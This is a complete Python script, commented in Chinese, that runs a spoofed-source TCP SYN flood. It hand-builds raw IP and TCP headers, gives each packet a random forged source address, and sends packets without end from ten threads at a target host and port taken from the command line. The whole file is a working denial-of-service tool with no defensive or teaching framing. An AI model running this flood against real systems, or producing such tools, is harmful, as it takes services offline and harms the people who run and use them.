#!/usr/bin/env python3
import socket
import random
import time
import struct
import threading
import sys

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

# 构造 IP 头 + TCP 头（仅 SYN 标志）
def create_syn_packet(src_ip, dst_ip, dst_port, src_port):
    # IP 头
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40  # IP头20 + TCP头20
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr)
    
    # TCP 头（SYN=1）
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_flags = 0b00000010  # SYN
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_header = struct.pack('!HHLLBBHHH',
        src_port, dst_port, tcp_seq, tcp_ack_seq,
        tcp_offset_res, tcp_flags, tcp_window,
        tcp_check, tcp_urg_ptr)
    
    return ip_header + tcp_header

# 发送 SYN 包（随机伪造源 IP）
def send_syn():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    while True:
        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        packet = create_syn_packet(src_ip, target_ip, target_port, src_port)
        try:
            sock.sendto(packet, (target_ip, 0))
        except:
            pass

print(f"[+] 开始向 {target_ip}:{target_port} 发送伪造源IP的SYN洪水")
for i in range(10):  # 10个线程
    t = threading.Thread(target=send_syn)
    t.daemon = True
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] 停止")
